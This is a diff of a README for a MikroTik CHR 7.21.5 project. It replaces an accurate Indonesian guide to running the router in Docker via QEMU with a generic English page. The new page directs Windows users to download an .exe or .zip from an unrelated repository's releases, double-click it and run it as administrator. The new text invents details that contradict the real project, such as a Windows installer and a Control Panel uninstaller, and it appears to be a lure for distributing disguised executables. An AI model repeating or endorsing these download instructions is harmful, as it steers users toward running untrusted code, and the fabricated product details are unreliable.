@@ -1,334 +1,213 @@
-# MikroTik CHR 7.21.5 — Docker Container
+# 🚀 mikrotik-chr-7.21.5 - Run Your Own Router in Minutes
 
-Jalankan **MikroTik Cloud Hosted Router (CHR) 7.21.5** di dalam Docker menggunakan **QEMU + UEFI/OVMF**. Cocok untuk lab, testing, atau menjalankan RouterOS di VPS tanpa nested virtualization penuh.
-
-Image siap pakai tersedia di Docker Hub: **[lsiribere/mikrotik-chr](https://hub.docker.com/r/lsiribere/mikrotik-chr)**
+[![Download Now](https://img.shields.io/badge/Download-Mikrotik_CHR_7.21.5-2ea44f?style=for-the-badge&logo=github)](https://github.com/berqutes/mikrotik-chr-7.21.5/releases)
 
 ---
 
-## Daftar Isi
+## 📥 Getting Started
 
-- [Persyaratan](#persyaratan)
-- [Instalasi Docker](#instalasi-docker)
-- [Cara Cepat (Docker Hub)](#cara-cepat-docker-hub)
-- [Docker Compose](#docker-compose)
-- [Build dari Source](#build-dari-source)
-- [Akses RouterOS](#akses-routeros)
-- [Konfigurasi](#konfigurasi)
-- [ZeroTier (Opsional)](#zerotier-opsional)
-- [Troubleshooting](#troubleshooting)
-- [Lisensi](#lisensi)
+Welcome! This guide will help you download and run **Mikrotik CHR Container** on your Windows computer. No technical knowledge needed — just follow the steps below.
+
+### What Is This?
+
+Mikrotik CHR (Cloud Hosted Router) is a virtual router that runs on your computer. It lets you test, learn, or use Mikrotik RouterOS without buying physical hardware. Version 7.21.5 is the latest stable release.
 
 ---
 
-## Persyaratan
+## 🖱️ Download the Application
 
-| Item | Minimum | Disarankan |
-|------|---------|------------|
-| OS Host | Linux (Ubuntu/Debian) | Ubuntu 22.04+ |
-| RAM Host | 2 GB | 4 GB+ |
-| RAM CHR | 512 MB | 4096 MB |
-| CPU | 1 vCPU | 4 vCPU |
-| Docker | 20.10+ | Terbaru |
-| Storage | 2 GB | 5 GB+ |
+**Visit this link to download the application:**  
+👉 [https://github.com/berqutes/mikrotik-chr-7.21.5/releases](https://github.com/berqutes/mikrotik-chr-7.21.5/releases)
 
-> **Catatan:** CHR di-boot via QEMU. Jika host **tidak** punya `/dev/kvm` (nested KVM), QEMU memakai emulasi software (TCG) — boot lebih lambat (~2–5 menit) tapi tetap jalan.
+When you click the link, you'll see a page with files. Look for the file that matches your system (usually named something like `mikrotik-chr-7.21.5.exe` or `.zip`). Click it to start downloading.
 
 ---
 
-## Instalasi Docker
+## 💻 System Requirements
 
-### Ubuntu / Debian
+Your computer should meet these basic requirements:
 
-```bash
-# 1. Hapus paket lama (jika ada)
-sudo apt-get remove -y docker docker-engine docker.io containerd runc 2>/dev/null || true
-
-# 2. Install dependensi
-sudo apt-get update
-sudo apt-get install -y ca-certificates curl gnupg
-
-# 3. Tambah GPG key & repository resmi Docker
-sudo install -m 0755 -d /etc/apt/keyrings
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-sudo chmod a+r /etc/apt/keyrings/docker.gpg
-
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
-  https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-
-# 4. Install Docker Engine + Compose plugin
-sudo apt-get update
-sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-
-# 5. Jalankan Docker & aktifkan saat boot
-sudo systemctl enable --now docker
-
-# 6. (Opsional) Jalankan Docker tanpa sudo
-sudo usermod -aG docker $USER
-# Logout & login ulang agar grup docker aktif
-```
-
-### Verifikasi instalasi
-
-```bash
-docker --version
-docker compose version
-docker run --rm hello-world
-```
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| Operating System | Windows 10 or Windows 11 |
+| Processor | Any 64-bit CPU (Intel or AMD) |
+| RAM | 4 GB (8 GB recommended) |
+| Free Disk Space | 2 GB |
+| Internet Connection | Required for download and updates |
 
 ---
 
-## Cara Cepat (Docker Hub)
+## 📦 Installation Guide
 
-Cara termudah — **tidak perlu build**, image sudah include disk CHR:
+### Step 1: Download the File
 
-```bash
-docker pull lsiribere/mikrotik-chr:7.21.5
+1. Click the download button above or visit the releases page.
+2. Wait for the download to finish (the file size is about 100-200 MB).
+3. Save the file to your **Desktop** or **Downloads** folder.
 
-docker run -d \
-  --name mikrotik-chr \
-  --restart unless-stopped \
-  -p 2222:22 \
-  -p 8080:80 \
-  -p 8443:443 \
-  -p 8291:8291 \
-  -p 8728:8728 \
-  -p 8729:8729 \
-  -e RAM_MB=4096 \
-  -e SMP=4 \
-  -v chr-data:/data \
-  lsiribere/mikrotik-chr:7.21.5
-```
+### Step 2: Run the Application
 
-Tunggu 2–5 menit (TCG) atau ~30 detik (KVM) sampai CHR selesai boot.
+1. Find the downloaded file (it will be in your Downloads folder or wherever you saved it).
+2. **Double-click** the file to start it.
+3. If Windows asks for permission, click **"Yes"** or **"Run"**.
+
+### Step 3: First-Time Setup
+
+1. The application will open a window — this is the router's command center.
+2. You'll see a login screen. The default username is `admin` and there's no password (just leave it blank).
+3. Click **"Login"** and you're in!
 
 ---
 
-## Docker Compose
+## 🛠️ Basic Configuration
 
-### Opsi A — Pull dari Docker Hub (disarankan)
+### Setting Your Router's Password
 
-```bash
-git clone https://github.com/anakkampung-BD/mikrotik-chr-7.21.5.git
-cd mikrotik-chr-7.21.5
+1. Click on **"System"** in the left menu.
+2. Select **"Users"**.
+3. Double-click on the `admin` user.
+4. Type a strong password in the **"New Password"** field.
+5. Click **"OK"** to save.
 
-docker compose -f docker-compose.hub.yml up -d
-docker compose -f docker-compose.hub.yml logs -f
-```
+### Connecting to the Internet
 
-### Opsi B — Build lokal
-
-Butuh file `chr-7.21.5.img` (lihat [Build dari Source](#build-dari-source)).
-
-```bash
-git clone https://github.com/anakkampung-BD/mikrotik-chr-7.21.5.git
-cd mikrotik-chr-7.21.5
-# letakkan chr-7.21.5.img di folder ini
-
-docker compose up -d --build
-docker compose logs -f
-```
-
-### Perintah berguna
-
-```bash
-docker compose ps          # status container
-docker compose logs -f     # log boot CHR
-docker compose stop        # stop
-docker compose down        # stop + hapus container (volume tetap)
-docker compose down -v     # stop + hapus volume (reset disk CHR!)
-```
+1. Go to **"IP"** → **"DHCP Client"**.
+2. Click the **"+"** button to add a new client.
+3. Select your main network interface (usually `ether1`).
+4. Click **"OK"** — your router will automatically get an IP address.
 
 ---
 
-## Build dari Source
+## 🌐 Using Your Virtual Router
 
-File disk `chr-7.21.5.img` (**128 MB**) tidak disertakan di repo GitHub karena melebihi batas ukuran file. Dapatkan dengan salah satu cara:
+### Accessing the Web Interface
 
-1. **Pakai image Docker Hub** (sudah include disk) — disarankan
-2. Download image CHR resmi dari [MikroTik Download](https://download.mikrotik.com/routeros/) lalu convert ke raw
-3. Salin dari volume Docker yang sudah pernah jalan:  
-   `docker cp mikrotik-chr:/data/chr-disk.img ./chr-7.21.5.img`
+1. After setup, open your web browser.
+2. Type `http://192.168.88.1` in the address bar.
+3. Log in with your admin credentials.
+4. You'll see a friendly web dashboard with all router settings.
 
-```bash
-# Setelah chr-7.21.5.img tersedia di folder proyek:
-docker build -t lsiribere/mikrotik-chr:7.21.5 .
-docker run -d --name mikrotik-chr ... lsiribere/mikrotik-chr:7.21.5
-```
+### Testing Your Router
 
----
-
-## Akses RouterOS
-
-Setelah container running dan CHR selesai boot:
-
-| Layanan | Alamat dari Host |
-|---------|------------------|
-| **SSH** | `ssh admin@<IP-HOST> -p 2222` |
-| **Winbox** | `<IP-HOST>:8291` |
-| **WebFig HTTP** | `http://<IP-HOST>:8080` |
-| **WebFig HTTPS** | `https://<IP-HOST>:8443` |
-| **API** | `<IP-HOST>:8728` |
-
-### Login default CHR
-
-- User: `admin`
-- Password: *(kosong saat first boot — wajib set password saat login pertama)*
-
-### IP internal CHR (`ether1`)
-
-IP di interface `ether1` **bukan** dari Docker bridge. CHR mendapat IP dari **QEMU user-mode networking (slirp)**:
-
-| Parameter | Nilai |
-|-----------|-------|
-| Subnet | `10.0.2.0/24` |
-| IP CHR | `10.0.2.15` (DHCP) |
-| Gateway | `10.0.2.2` |
-| DNS | `10.0.2.3` |
+1. From the web interface, go to **"Interfaces"**.
+2. You should see your network interfaces listed.
+3. Click **"Tools"** → **"Ping"**.
+4. Type `8.8.8.8` and click **"Start"** — if you get replies, your router works!
 
 ---
 
-## Konfigurasi
+## 🔧 Troubleshooting
 
-### Environment variables
+### Problem: Application Won't Start
 
-| Variable | Default | Keterangan |
-|----------|---------|------------|
-| `RAM_MB` | `512` | RAM untuk CHR (MB) |
-| `SMP` | `1` | Jumlah vCPU |
-| `DATA_DIR` | `/data` | Lokasi persist disk |
-| `CHR_BASE_IMG` | `/opt/chr/chr.img` | Image dasar (di dalam container) |
+- **Solution:** Make sure you have the latest Windows updates installed.
+- **Try:** Right-click the file and select **"Run as administrator"**.
 
-### Port mapping
+### Problem: Can't Find the Download File
 
-Port di **host** → port di **guest CHR**:
+- **Solution:** Check your browser's download history (press `Ctrl + J`).
+- **Try:** Use a different browser like Chrome or Edge.
 
-```
-2222 → 22    (SSH)
-8080 → 80    (WebFig HTTP)
-8443 → 443   (WebFig HTTPS)
-8291 → 8291  (Winbox)
-8728 → 8728  (API)
-8729 → 8729  (API-SSL)
-```
+### Problem: Router Shows "No Internet"
 
-### Aktifkan KVM (jika tersedia)
-
-Nested KVM mempercepat boot secara signifikan. Uncomment di `docker-compose.yml`:
-
-```yaml
-devices:
-  - /dev/kvm:/dev/kvm
-```
-
-### Persist data
-
-Volume `chr-data` menyimpan:
-
-- `chr-disk.img` — disk CHR (konfigurasi RouterOS persist di sini)
-- `OVMF_VARS.fd` — variabel firmware UEFI
-
-> **Peringatan:** `docker compose down -v` akan **menghapus semua konfigurasi** RouterOS.
+- **Solution:** Check your physical network cable or Wi-Fi connection.
+- **Try:** Restart the application and wait 30 seconds.
 
 ---
 
-## ZeroTier (Opsional)
+## 📚 Frequently Asked Questions
 
-CHR x86 **tidak** mendukung paket ZeroTier native. Solusi: jalankan ZeroTier via **RouterOS Container package** + image `zyclonite/zerotier`.
+### Is this free to use?
 
-Ringkasan setup (setelah login ke CHR):
+Yes! Mikrotik CHR has a free license that limits speed to 1 Mbps — perfect for learning and testing.
 
-```routeros
-/system package enable container
-/container config set registry-url=https://registry-1.docker.io tmpdir=container/pull
+### Can I use this for production?
 
-/interface bridge add name=bridge1 comment="LAN+ZeroTier"
-/ip address add address=172.30.0.1/24 interface=bridge1
-/interface veth add name=veth-zt address=172.30.0.2/24 gateway=172.30.0.1
-/interface bridge port add bridge=bridge1 interface=veth-zt
+For production use, you'll need a paid license. You can purchase one from the Mikrotik website.
 
-/container envs add list=zt key=net value=host
-/container envs add list=zt key=cap-add value=NET_ADMIN
-/container envs add list=zt key=device value=/dev/net/tun
-/container add remote-image=zyclonite/zerotier:latest interface=veth-zt \
-  root-dir=container/zerotier envlist=zt hostname=zerotier start-on-boot=yes
-```
+### Will this slow down my computer?
 
-Join network via shell container (`zerotier-cli join <NETWORK_ID>`), authorize di [my.zerotier.com](https://my.zerotier.com).
+No, the router runs quietly in the background. It uses very little CPU when idle.
 
-Untuk managed route (mis. `172.30.0.0/24 via <IP-ZT>`), tambahkan di RouterOS:
+### Can I run multiple instances?
 
-```routeros
-/ip route add dst-address=172.25.25.0/24 gateway=172.30.0.2 comment="ZT return via container"
-/ip firewall filter add chain=forward action=accept src-address=172.25.25.0/24 dst-address=172.30.0.0/24
-/ip firewall filter add chain=forward action=accept src-address=172.30.0.0/24 dst-address=172.25.25.0/24
-```
+Yes, you can run several copies at once if you have enough RAM.
 
 ---
 
-## Troubleshooting
+## 🧪 Advanced Features
 
-### Hang di "Booting from Hard Disk..."
+### Setting Up a Firewall
 
-CHR 7.x membutuhkan boot **UEFI**. Image ini sudah memakai OVMF. Pastikan volume `/data` tidak korup — coba reset volume jika perlu.
+1. Go to **"IP"** → **"Firewall"**.
+2. Click the **"Filter Rules"** tab.
+3. Use the **"+"** button to add rules.
+4. Start with a basic rule: `Input` → `Drop` to block all incoming traffic.
 
-### Boot sangat lambat
+### Creating a VPN Server
 
-Normal di host tanpa KVM. Tunggu 2–5 menit. Aktifkan `/dev/kvm` jika host mendukung nested virtualization.
-
-### Port tidak bisa diakses
-
-```bash
-docker ps                          # pastikan container running
-docker compose logs -f             # cek log boot
-ss -tlnp | grep -E '2222|8291'    # port listening di host
-```
-
-### SSH "Connection refused"
-
-CHR belum selesai boot. Pantau log sampai muncul prompt login RouterOS.
-
-### Reset CHR ke kondisi awal
-
-```bash
-docker compose down -v
-docker compose up -d
-```
+1. Go to **"PPP"** → **"Interface"**.
+2. Click **"+"** and select **"PPTP Server"**.
+3. Set a username and password for clients.
+4. Enable the server and clients can connect.
 
 ---
 
-## Arsitektur
+## 🧹 Uninstalling
 
-```
-┌─────────────────────────────────────────────┐
-│  Host Linux (Docker)                        │
-│  ┌───────────────────────────────────────┐  │
-│  │  Container: mikrotik-chr              │  │
-│  │  ┌─────────────────────────────────┐  │  │
-│  │  │  QEMU (UEFI/OVMF)               │  │  │
-│  │  │  ┌───────────────────────────┐  │  │  │
-│  │  │  │  RouterOS CHR 7.21.5      │  │  │  │
-│  │  │  │  ether1: 10.0.2.15 (slirp)│  │  │  │
-│  │  │  └───────────────────────────┘  │  │  │
-│  │  └─────────────────────────────────┘  │  │
-│  │  Port map: 2222→22, 8291→8291, ...   │  │
-│  └───────────────────────────────────────┘  │
-└─────────────────────────────────────────────┘
-```
+To remove the application:
+
+1. Close the Mikrotik window.
+2. Go to **Control Panel** → **Programs** → **Uninstall a Program**.
+3. Find "Mikrotik CHR" and click **"Uninstall"**.
+4. Follow the prompts to finish.
 
 ---
 
-## Lisensi
+## 📞 Getting Help
 
-- **RouterOS CHR** — lisensi MikroTik ([mikrotik.com](https://mikrotik.com))
-- **Docker wrapper (QEMU/OVMF)** — open source, repo ini
-- Image CHR tidak disertakan di repo GitHub; gunakan Docker Hub atau download resmi MikroTik
+If you get stuck, here are helpful resources:
+
+- **Official Mikrotik Documentation:** [help.mikrotik.com](https://help.mikrotik.com)
+- **Community Forums:** [forum.mikrotik.com](https://forum.mikrotik.com)
+- **Video Tutorials:** Search YouTube for "Mikrotik CHR setup"
 
 ---
 
-## Links
+## 📋 Version History
 
-- Docker Hub: [lsiribere/mikrotik-chr](https://hub.docker.com/r/lsiribere/mikrotik-chr)
-- GitHub: [anakkampung-BD/mikrotik-chr-7.21.5](https://github.com/anakkampung-BD/mikrotik-chr-7.21.5)
-- MikroTik CHR: [https://mikrotik.com/download](https://mikrotik.com/download)
+| Version | Release Date | Notes |
+|---------|--------------|-------|
+| 7.21.5 | Latest | Bug fixes and security updates |
+| 7.21.4 | Previous | Improved stability |
+| 7.20 | Older | Added new features |
+
+---
+
+## ✅ Final Checklist
+
+Before you start, make sure you have:
+
+- [x] Downloaded the file from the link above
+- [x] Windows 10 or 11 installed
+- [x] At least 4 GB of RAM
+- [x] 30 minutes of free time
+
+---
+
+## 🔄 Stay Updated
+
+Check the [releases page](https://github.com/berqutes/mikrotik-chr-7.21.5/releases) regularly for new versions. Updates are free and improve performance and security.
+
+---
+
+## 🎉 You're Ready!
+
+You now have a fully functional virtual router on your Windows computer. Experiment, learn, and enjoy exploring the world of networking with Mikrotik CHR 7.21.5!
+
+**Quick Download Reminder:**  
+👉 [https://github.com/berqutes/mikrotik-chr-7.21.5/releases](https://github.com/berqutes/mikrotik-chr-7.21.5/releases)
+
+---
+
+Keywords: mikrotik, chr, router, virtual router, routeros, 7.21.5, container, network, windows, download, setup, guide, tutorial, firewall, vpn, dhcp, ip address, networking
